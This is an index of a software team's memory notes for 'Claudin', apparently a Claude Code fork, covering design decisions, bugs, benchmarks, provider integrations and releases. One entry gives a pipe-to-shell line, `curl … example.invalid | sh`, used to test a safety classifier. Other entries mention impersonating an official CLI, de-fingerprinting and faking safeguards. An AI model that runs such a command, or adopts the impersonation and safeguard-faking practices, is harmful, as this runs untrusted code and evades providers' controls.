# Team Memory

> Coding gotchas live in `.claudin/rules/` (loaded by path; git-conventions.md always-on). This index holds state, decisions, refs.

## Decisions
- [Only main owns background agents (10-15)](decisions/only-main-owns-background-agents.md) — a sub-agent's spawn runs inline; routing its report rejected
- [Navigation map syncs at the end of a turn, /map (#287)](decisions/rule-map-end-of-turn.md) — stateless dirty gate; LLM auto-annotate rejected
- [Every MCP call collapses, with a batch clock (#284)](decisions/mcp-calls-collapse-with-clock.md) — Calling/Called; errored calls leave the group
- [Collapsed writes: one ⎿ line, no stack (10-12)](decisions/collapsed-writes-one-line.md) — latest op of any kind owns it; no clock on writes
- [Bash read lane + one cut (10-09)](decisions/bash-read-lane.md) · [tool results compacted, never cut (10-10)](decisions/summarizer-lossless.md)
- [Global user memory dir ~/.claudin/memory/ (10-09)](decisions/global-user-memory-dir.md) — `CLAUDIN_GLOBAL_MEMORY=0`
- [Starved relief compacts, keep-alive on, forks don't clip (10-09)](decisions/relief-starved-compacts-keepalive-default.md) — `=0` killswitches
- [Memory extraction on Haiku — REJECTED 10-10](decisions/extract-memories-haiku-rejected.md) — −92% but ~1¢/turn; lost the user profile
- [Each first-request rule said once; memory rules on demand (09-29)](decisions/first-request-dedup-memory-rules-on-demand.md) — malformed writes refused
- [/new and /resume keep a running turn via Ctrl+B (#268)](decisions/keep-running-turn-across-new-resume.md) — multi-session runtime rejected
- Patch: [on the wire (#244)](decisions/patch-tool-rename.md) · [any earlier read (#242)](decisions/apply-patch-any-read.md) · [applies what matches (09-29)](decisions/patch-applies-what-matches.md)
- [Edit takes Patch's any-read rule (10-12)](decisions/edit-any-read.md) — an exact single match applies unread; Write keeps the full gate
- [Sub-agents run one effort level below a raised parent (09-29)](decisions/subagent-effort-cap-high-default.md) — xhigh→high −24%
- Superseded by the lane: [bounded keep #252](decisions/cap-keeps-model-bounded-reads.md) · [cat credit, off](decisions/bash-read-passthrough-not-promoted.md)
- [All 94 upstream flag gates removed (09-25)](decisions/upstream-flag-gates-removed-claudin-killswitches.md) — inlined; 6 `CLAUDIN_*` killswitches
- [Patch/Edit `then` + path-keeping Bash cap ON (09-25)](decisions/edit-then-and-cap-keep-paths-default-on.md) — calls −14%
- [Path globs in read commands count as read-only (09-25)](decisions/readonly-path-globs-default-on.md) — classifier 20→11
- [Bash advises, 4 dev tools deferred (#244)](decisions/bash-redirects-advisory-dev-tools-deferred.md) — killswitches in the file
- [SendMessage reaches other local sessions (#243)](decisions/cross-session-messaging.md) — owner-only sockets, `await_reply`
- [Batch Read on by default, hooks per file (#246)](decisions/batch-read-default-on.md) — `CLAUDIN_READ_MULTI=0`
- [Opus 5.5 defaults to medium effort, like Claude Code (#242)](decisions/opus-5-5-default-effort-medium.md) — closed the cost gap
- [Team memory: git IS the sync (09-21)](decisions/team-memory-git-is-the-sync.md) — HTTP sync + LLM recall deleted
- [`safeguards` classifier — REJECTED 09-22](decisions/safeguards-classifier-rejected.md) — CC doesn't send it on the real endpoint
- [Tool-prompt tone rewrite — DROPPED 09-13](decisions/prompt-tone-rewrite-unmeasurable.md) — no over-compliance in 3,391 Bash calls
- [Seven catch-all dirs retired — 15 slices + 3 non-slices](decisions/reorg-catch-all-dirs-retired.md) — moduleBoundaries.test.ts
- [memory_delta deleted 08-07](decisions/memory-delta-removed-double-send.md) — a second full copy, not a delta (~57 KB/session)
- Repo map — REJECTED twice: [flat 08-07](decisions/repo-map-rejected-orientation-measured.md) · [graph 08-17](decisions/repo-map-graph-topology-degenerate.md) — loses to one `ls`
- [LSPTool back since 06-17, plugin-only](decisions/lsp-tool-reintroduced-plugin-only.md) — read-only, cache-safe
- [Explore agent: removed 08-18, back ON 09-25](decisions/explore-agent-removed.md) — calls −29%, wall +30%; `CLAUDIN_EXPLORE_AGENT=0`
- [Fork-subagent by default](decisions/fork-subagent-by-default.md) — no subagent_type forks; a named agent stays fresh
- [Git tool (D2), shipped 08-04](decisions/git-tool-design.md) — cost −11.5%; the batching claim did NOT survive the A/B
- [Effort is project-scoped like provider and model](decisions/effort-is-project-scoped.md) — `/effort inherit` clears
- [Adaptive thinking on by default (07-13)](decisions/adaptive-thinking-default-on.md) — `CLAUDIN_ENABLE_ADAPTIVE_THINKING=0` opts out
- [Essential-traffic privacy level by default](decisions/anthropic-startup-traffic-disabled-default.md) — 7→0 startup requests; opt-in `=0`
- [Footer PR pill supports GitLab + Gitea](decisions/pr-status-gitlab-gitea.md) — prStatusHosts in config.json
- [Bash filter shape blindness — CLOSED 08-29](decisions/bash-filter-shape-wontfix.md) — specs cap at 6.8% of chars over 18.3k calls
- [code-review-graph — REJECTED 08-08](decisions/code-review-graph-evaluated-rejected.md) — loses to reading the diff
- [Cache TTL: agent:* 5m, fork keeps 1h](decisions/cache-ttl-tiering-subagents.md) — new one-shot querySources → SHORT_LIVED_QUERY_SOURCES
- [Defer-cache-marker default REVERSED to 0 (09-23)](decisions/defer-cache-marker-shipped.md) — 2048 cost 4–17% more; opt-in only
- [Devin provider port halted 06-06](decisions/devin-provider-port-halted.md) — f31 attestation is a hard blocker
- [OpenTelemetry stays devDep-only + stubbed](decisions/opentelemetry-devdep-stubbed.md) — removal REJECTED 07-08

## Bugs
- FIXED: [Turn-opening full-prefix rewrites (10-01)](bugs/turn-opening-full-prefix-rewrites.md) — server thinking drops; guards in cache.md §1
- [Frontmatter values are cut at " #"](bugs/frontmatter-hash-truncates-values.md) — YAML comment; 18 memory descriptions citing PRs truncated
- FIXED 10-12: [Resume restored a REFUSED Write as read](bugs/resume-restores-refused-write.md) — extractReadFilesFromMessages checks is_error
- [Built-in sub-agents never retry a 529](bugs/builtin-subagents-skip-529-retry.md) — exact-match querySource set; not fixed
- [The missing-module stub's default is TRUTHY](bugs/missing-module-stub-makes-dead-things-look-alive.md) — `claudin install`, `mcp serve` broken
- [systemPrompt.main.txt regen captures harness text](bugs/systemprompt-snapshot-harness-drift.md) — diff the regen against source
- [Two latent bugs pinned, not fixed (09-20)](bugs/latent-bugs-pinned-not-fixed.md) — autobackground misses `sleep N`; deleted rules resurrect
- [Provider pointer heal — open follow-ups](bugs/provider-pointer-heal-followups.md) — mid-session reconcile, cache GC, migrate rerun
- [Codex 403 HTML block misread as "run /login"](bugs/codex-403-html-block-misclassified-as-login.md) — a Cloudflare edge block
- [/diff canonicalizes worktrees to the main repo](bugs/diff-reviewer-worktree-canonicalization.md) — fix deferred on purpose
- [checkBatchWritePermission's updatedInput:{} clobbers the input](bugs/checkbatchwrite-updatedinput-clobbers-input.md) — echo the real input
- [memory-turn-by-turn RSS bench flakes under full bun test](bugs/memory-turn-by-turn-bench-flaky-full-suite.md) — re-run in isolation first
- [stream-json prints each assistant event twice](bugs/stream-json-duplicate-assistant-events.md) — benches counting blocks dedupe by uuid
- [Legacy memory migration resurrects moved team files](bugs/legacy-memory-migration-resurrects-team-files.md) — copied back as untracked
- FIXED: [sub-agents on parent model](bugs/subagents-ran-on-parent-model.md) · [Agent schema freeze](bugs/agent-schema-drops-run-in-background.md) · [RunTests env](bugs/runtests-tool-shell-env-bugs.md)
- FIXED: [WaitFor params](bugs/waitfor-drops-optional-params.md) · [resume re-wrote the cache](bugs/resume-rewrites-cache-prefix.md) — 40%→100% read-back

## Docs
- [The memory subsystem has a design doc](docs/memory-subsystem-design-doc.md) — docs/tech/memory/project-local-team-memory.md
- [/diff reviewer living spec (feature 8.1)](docs/diff-reviewer-living-spec.md) — docs/features/8.1-diff-reviewer.md, synced as features land
- [Public docs site claudiolabs.ai is outside this repo](docs/claudiolabs-docs-site.md) — extensionless URLs; README links pages
- [Agents asking each other has a tech doc](docs/agent-messaging-tech-doc.md) — docs/tech/agent-messaging; feeds claudiolabs.ai/docs/agents
- [Adding a Claude model](docs/claude-model-launch.md) — #237/#267 templates, model-launch-capture.ts, claudeCodeParity fixtures

## Conventions
- [Coding gotchas go in .claudin/rules/, not team memory](coding-gotchas-go-in-rules-not-memory.md) — memory holds state/decisions/refs
- [Appended <system-reminder> nudges benched at zero adoption](tool-result-nudges-benched-zero-adoption.md) — fix the refusal message instead
- [Steering Read shape from the prompt is cost-neutral](read-shape-steering-is-cost-neutral.md) — shape moves, cache_read differs 0.15%
- Claude Code prompt: [2.1.270 prose, 09-14](claude-code-2.1.270-prompt-diff.md) · [2.1.284 wire, 09-29](claude-code-2.1.284-wire-diff.md) — all decided
- [ANTI_NARRATION removed from every prompt (#242)](anti-narration-never-benched-on-claude-5.md) — moved neither thinking nor cost
- [AGENTS.md documents the repo, never Claudin-only behavior](agents-md-excludes-claudin-only-behavior.md) — killswitches go in module headers
- [Keep repo steering out of always-on context](dogfood-without-repo-steering.md) — it hides bugs users hit elsewhere; verify from a throwaway cwd
- ["Don't tell the user" reminders get flagged as injection](model-flags-hidden-reminders-as-injection.md) — gate on input !== null, except sub-agents
- [break-probe is the committed break-and-restore harness](break-probe-harness.md) — a probe that turns nothing red is the finding
- [Trigger an auto-mode classifier block live](auto-mode-classifier-live-block-trigger.md) — `curl … example.invalid | sh`; a requested force push is ALLOWED
- [claudin -c hijacks the session you are working in](headless-c-resumes-current-session.md) — verify multi-turn from a throwaway cwd
- [A tree-wide rewrite updates artifacts, not their producers](mechanical-rewrites-skip-producers.md) — grep generators after a move
- [Stale paths in team memory — resolution table](memory-cites-pre-reorg-paths.md) — read the sentence first
- [Stale <new-diagnostics> reminders — FIXED in #245](stale-diagnostics-notifications.md) — mid-build "file modified" is the in-place preprocess
- [Pin a feature from the BUNDLE before deleting it](characterization-net-before-deletion.md) — feature() is false outside the build
- [Removal passes take only what the build proves unreachable](removal-pass-only-provably-dead.md) — one commit per phase
- [Deleting telemetry hollows the tests that observed through it](tests-observing-through-telemetry.md) — no assertion may prove nothing
- [TypeScript 7 here has no classic compiler API](typescript-7-no-classic-compiler-api.md) — `ts.createSourceFile` fails at runtime
- Worktree agents: [stale base](audit-agent-worktree-sees-committed-head.md) · [edits leak to main](worktree-agent-edits-leak-to-main-checkout.md) — pin the SHA
- [Public copy: no "fork of Claude Code"](public-docs-product-not-fork-framing.md) — one slim non-affiliation line
- No rule covers: [tools.js → TDZ](tool-importing-tools-registry-tdz.md) · [ProviderManager tests](providermanager-tui-tests-fail-non-tty.md) · [CI order leaks](full-suite-in-ci-portability.md) · [full repaint](ink-bordered-fillheight-panes-recipe.md)

## Repo health
- [Attachment producers leaked parent state into sub-agents](attachment-producers-leak-parent-state.md) — #224/#226/#227; agentId is NOT the gate
- [Betas Claude Code sends and Claudin doesn't (09-22)](claude-code-beta-gap-2026-09-22.md) — a mock base URL fakes safeguards
- [De-fingerprinting round (08-15)](defingerprinting-branch-2026-08.md) — env clusters move as units
- [tsc --noEmit reached ZERO (08-13)](typecheck-backlog-shape.md) — the ratchet and its absolute-path fingerprint trap
- Removed: [upsell commands 09-15](upsell-commands-missing-login.md) — hung on the absent Login stub · [growthbook.ts 09-25](growthbook-source-dead-stub-is-real.md) — dead but tested
- [knip's "unused export" is not "unused"](knip-unused-export-is-not-unused.md) — nothing imports it; `bun run build` is the gate
- [Token census 09-26..28 — rewrite fan-out 77%](token-census-2026-09-28.md) — thinking stays resident; 5m-TTL waits $65
- [Token census 09-09..10 — transcripts miss rule/CLAUDE.md injections](token-census-2026-09-10-hidden-injections.md) — ~19% of context
- [TTL-expiry check 10-12](ttl-expiry-check-2026-10-12.md) — main is 1h; clip→next-turn floor unexplained
- Weekly censuses: [09-08](weekly-token-census-2026-09-08.md) · [09-20](weekly-token-census-2026-09-20.md) · [10-09](weekly-token-census-2026-10-09.md) — rewrites 39% of cost
- [Feature-usage validation 09-14..16](feature-usage-census-2026-09-16.md) — its "79 symbol= calls" is WRONG (25) · [09-14..15](feature-usage-census-2026-09-15.md)
- [Per-turn filesystem scans audited 08-07](per-turn-fs-scan-audit.md) — scanMemoryFiles off per turn; worktree exit leaks rule caches
- Tool error censuses: [09-20](tool-error-census-2026-09-20.md) · [Edit/Write 10-12](edit-write-error-census-2026-10-12.md) · [dev tools 10-11](devtool-error-census-2026-10-11.md) · [10-15](tool-error-census-2026-10-15.md) — 2.2%; 8 causes + 2 follow-ups fixed
- FIXED: [sync-plugin hang #57](headless-sync-plugin-install-broken-import.md) · [outline mask desync](outline-mask-desync-zero-symbols.md) · [read-gate #157](read-gate-false-refusals-census-2026-09.md)

## Roadmap & major features
- [Dead-code + codename cleanup #204 (09-16)](dead-code-cleanup-2026-09-15.md) — −25k lines · rounds [r2](dead-code-round-2-2026-09-18.md) · [r3](dead-code-round-3-2026-09-18.md) · [r4](dead-code-round-4-2026-09-18.md) · [r5 #214](dead-code-round-5-2026-09-19.md)
- Dead-code seeds (SPENT): [inventory](unreachable-clusters-inventory-2026-09-18.md) · [r3](dead-code-round-3-plan-seed.md) · [r4](dead-code-round-4-seed.md) · [bash](bash-parser-unreachable-behind-tree-sitter-flag.md)
- [The three dead-code gates and what none sees](deadcode-gate-include-allowlist-hole.md) — knip answers "imported?", never "reachable?"
- [Tier-3 giant-file split roadmap](tier3-file-split-roadmap.md) — round 2 done 09-20; md5 split gate, back-edge trap
- [PR #129's code vanished from main](pr-129-lost-to-force-push.md) — recover via refs/pull/N/head, never `gh pr diff`
- [Unified context-relief policy (#156)](context-relief-unified-policy-ab.md) — cost −25%; on 1M the retain floor sits ABOVE its band
- [Product roadmap 2026-07](roadmap-2026-07.md) — R1..R5, R3 bg agent done · [tokens](token-efficiency-roadmap.md)
- [Rule files have FOUR silent failure modes](rule-files-four-silent-failure-modes.md) — inert `paths:`, unconditional `globs:`, wrong facts, map drift
- [Dev-tooling token roadmap 2026-08](dev-tooling-token-roadmap.md) — D1 D2 D5 done; D3 Read re-read dedup (~9.5%) and D4 open
- [A session-corpus grep census overcounts ~3x](session-corpus-census-inflation.md) — pair tool_use↔tool_result
- [Bash-as-file-reader census + redirect reach (08-09/16)](bash-file-read-census-and-redirect-reach.md) — refusal converted 84.7%
- [Auto-outline pivot's false cap claim (08-09)](auto-outline-pivot-false-cap-claim.md) — 1,809 is an upper bound; PR #67 closed on it
- [Token-bench measurement traps](token-bench-measurement-traps.md) — `--allowedTools` doesn't remove tools; check range overlap
- Bench traps: [cache-ab-bench](cache-ab-bench-unreliable.md) · [head-anchor](cache-head-anchor-branch-state.md) · [-p orphans bg](headless-bg-agents-not-drained.md) · [clip-pin](clip-pin-cache-ab-2026-07-25.md)
- [R3 background agent — IMPLEMENTED 07-17](r3-background-agent-implemented.md) — workflow run|watch, triggers, worktree+PR
- [/create bundled skill](create-skill-bundled-pr.md) — loader gotchas incl. agent frontmatter `model`
- [Fork vs fresh A/B 09-09](fork-vs-fresh-ab-2026-09-09.md) — fresh Code agent −44% at equal answers; 3 parallel forks pass
- [Delegation A/B 09-23](delegation-steer-ab-2026-09-23.md) — lean Agent text held every gate (N=5)
- Typecheck tool: [baseline](typecheck-tool-baseline-design.md) · [phantom errors, fixed](typecheck-baseline-message-fingerprint-fragile.md) · [A/B citation](typecheck-ab-bench-fixture-flaw.md)
- [React Compiler's t0 param → ~1400 TS7006](react-compiler-props-param-typing.md) — count sites (403), not errors
- [The 107 TS2307 are the fork's shape](missing-subsystems-retired-by-all-any-declarations.md) — all-`any` .d.ts on purpose
- [RunTests language coverage](runtests-tool-language-coverage.md) — 23 runners; JUnit/JSON vs heuristic tier
- Search: [stack measured 08-12](search-stack-measured.md) · [symbol-parser options](symbol-parser-options-researched.md) — tree-sitter shippable
- [Outline-scanner phantoms that DELETE declarations (#141)](outline-blind-to-nested-members.md) — 6 traps; witness-based gate
- Cross-CLI A/B: [2-arm 08-12](cli-search-edit-ab-bench.md) · [3-arm 09-22](three-cli-ab-bench-2026-09-22.md) · [Go build 09-29](build-project-ab-bench-2026-09-29.md)
- [Session cache A/B vs Claude Code (09-23..10-09)](session-cache-ab-bench-2026-09-23.md) — +53% → +7% after #239; Sonnet 5.5 +17%
- [Sub-agent real-unit A/B (09-29)](subagent-unit-ab-2026-09-29.md) — effort cap `high` −24%, quality equal
- [Session cost round 3 (09-23)](session-cost-round-3-2026-09-23.md) — effort medium closes it
- [Prompts v2 — default since #242, killswitches gone 09-29](prompts-v2-2026-09.md) — 1st request 27.2k→19.9k (CC 20.2k)
- [Request prefix, broken down](request-prefix-size-2026-09-23.md) — eager tools were ≈20k; deferred schemas unbilled
- [Build tool A/B — the `directory` gap](build-tool-ab-directory-gap.md) — with `directory`: −7.7% cost, −25% output
- [Dev tools deferred + Bash advice A/B (09-24)](dev-tools-deferred-advice-ab-2026-09-24.md) — no regression, prefix −3.3k
- [cat-read + batch-Read A/Bs (09-24)](cat-read-and-batch-read-ab-2026-09-24.md) — batch Read ties CC · [read-files 09-29](read-files-ab-2026-09-29.md) failed
- [Fewer requests per session — 4 rounds (09-25)](request-count-levers-2026-09-24.md) — `then` + path-keeping cap promoted
- [Cut results cost ~0.3% of requests (09-25)](cut-results-request-cost-2026-09-25.md) — #252 targets the capped reads, unmeasured
- [Single deferred cache marker → full-history rewrites — FIXED 09-13](single-marker-lookback-full-rewrites.md) — lost 38.6% of cache writes

## Providers & models
- [/models discovery only parses `context_length`](context-window-discovery-field-names.md) — strict OpenAI/Azure return nothing
- [OpenAI-compat reasoning effort was inert — FIXED](opencode-gateway-effort-dead-on-arrival.md) — levels from models.dev
- [provider !== 'anthropic' includes bedrock/vertex/foundry](provider-tag-not-anthropic-includes-cloud.md) — gate with an explicit set
- [Native-1M models need a getContextWindowForModel branch](native-1m-context-window.md) — modelSupports1M alone doesn't set it
- [SDK error checks: isSdk* guards, never instanceof](externalized-sdk-copies-instanceof-apierror.md) — externalized SDKs load their own copy
- [CLAUDIN_SKIP_VERTEX_AUTH stub must return a real Headers](vertex-skip-auth-stub-needs-headers.md) — vertex-sdk calls .get() on it
- [Adding a /provider preset: the skill](../../skills/add-provider-preset/SKILL.md) · [old recipe](openai-compat-preset-recipe.md)
- [Kimi Code OAuth provider (device flow)](kimi-code-oauth-provider.md) — mirrors xAI; impersonates the official CLI (gray area)
- [Shim-only body fields need a model-aware gate](shim-only-body-fields-model-aware-gate.md) — gate on activeTransportUsesOpenAiShim
- [Codex strict schemas → placeholder args](codex-strict-schema-placeholder-args.md) — `pages:""` looped Read 135×; strip ""/null
- [Codex OAuth prompt cache — key only](codex-oauth-prompt-cache-params.md) — Codex 400s on prompt_cache_retention
- [Grok cache hint x-grok-conv-id — UNMEASURED](grok-cache-hint-missing.md) — no xAI account to measure with
- [xAI / Grok OAuth provider — on main since 09-10](xai-oauth-provider-shipped.md) — loopback PKCE, pinned port 56121

## Build, release & distribution
- [Native-binary distribution (bun --compile)](compile-binary-distribution.md) — rg+sharp vendored; strip breaks binaries
- [Binary release process](binary-release-rollout-state.md) — release-binaries.yml via OIDC; verify with `npm access list`
- [claudin-bin on the AUR + Omarchy](aur-omarchy-packaging.md) — PR #134, NOT live
- [Node engine floor 22.12.0](node-engine-floor-22.md) — commander 15 is ESM-only; breaks Node 20
- [Incremental bun install misses nested deps](incremental-bun-install-misses-nested-deps.md) — "No matching export": `bun install --force`
- Dependabot audits: [08-03](dependabot-bumps-2026-08-03-no-code-changes.md) · [08-10](dependabot-bumps-2026-08-10-no-code-changes.md) · [08-17](dependabot-bumps-2026-08-17-no-code-changes.md) · [08-31](dependabot-bumps-2026-08-31-audited.md) · [09-07](dependabot-bumps-2026-09-07-audited.md) · [09-28 undici](dependabot-bumps-2026-09-28-audited.md)
- [Dependabot 10-06 — shell-quote 1.11 Bash bypass](dependabot-bumps-2026-10-06-audited.md) — fixed + MCP issuer; Foundry default retires 11-30
- [Dependabot #296 (10-13)](dependabot-bumps-2026-10-13-audited.md) — shell-quote 1.12 hid &> >| <> redirect targets; restored
- [v8cache GC blocked process exit — fixed](startup-v8cache-gc-blocked-exit.md) — detached child + daily stamp
- [Launcher jemalloc LD_PRELOAD leak — fixed 06-11](launcher-jemalloc-ld-preload-leak.md) — it broke the OAuth browser
- [Plans dir project-local + hardened](plans-dir-project-local-hardening.md) — realpath check, 0700, global gitignore
- [PRs go to GitHub via gh](repo-prs-github-via-gh.md) — origin claudio-labs/claudin; the Gitea + tea flow is gone
- [main's GitHub ruleset](main-branch-ruleset-protection.md) — admin bypass; an empty include made it inert

## TUI / diff / tooling
- [Inline TUI stranded the frame at the top — FIXED 09-11](inline-fullreset-per-message.md) — #172 anchored only one branch
- [Auto-wrap eats a row (side-panel checkerboard)](ink-autowrap-eats-a-row.md) — DECAWM off per paint
- [parseGitDiff must not assume a/ b/ prefixes](gitdiff-mnemonic-prefix-parse.md) — diff.mnemonicPrefix emits c/ w/
- [collapseRuns + blank-strip is safe since 06-27](bashfilter-collapseruns-blankstrip-footgun.md) — don't reintroduce marker-on-blank
- [bashfilter fixture edits must keep byte length](bashfilter-fixtures-byte-length-sensitive.md) — ROI tests assert reduction %
- [Bash filter samples live in ONE dir](bash-filter-sample-corpus-unified.md) — __fixtures__/samples/; 87 of 142 unmapped
- [Live-verifying TUI mouse under tmux](tmux-mouse-click-verification.md) — fullscreen only; SGR via send-keys
- [apply_patch failure taxonomy](apply-patch-failure-taxonomy.md) — 11.9% vs Edit 4.6%, mostly read gates (lifted #242)
- ["∴ <sentence>" lines are progress updates, not leaked thinking](progress-update-lines-read-as-leaked-thinking.md) — ● like CC since 09-25

## References (sibling repos, wire formats, archives)
- [openclaude: claudin's PARENT fork, mine it for BUGS](openclaude-sibling-fork-reference.md) — forked 04-25; 17/28 bug claims real
- [Three code-graph siblings audited 08-17](code-graph-siblings-audited.md) — no measured win; 4 ideas kept
- [opencode (SST) feature gaps](opencode-sst-feature-gap-reference.md) — 4 gaps · [OAuth port queue](web-login-provider-port-queue.md)
- [Windsurf upstream reference](windsurf-upstream-reference.md) — opencode-windsurf-auth has the wire format + OAuth flow
- [mitmproxy recipe for Rust agent CLIs](mitmproxy-rust-binary-recipe.md) — three CA env vars, set together
- Devin RE [ARCHIVED 06-12](../../../docs/tech/devin-provider/README.md): [backend](devin-shares-codeium-backend.md) · [quirks](devin-oauth-quirks.md) · [f31 vs quota](devin-port-works-quota-blocker.md) · [f31 RE](devin-f31-characterization.md) · [A/B](devin-wire-ab-procedure.md)
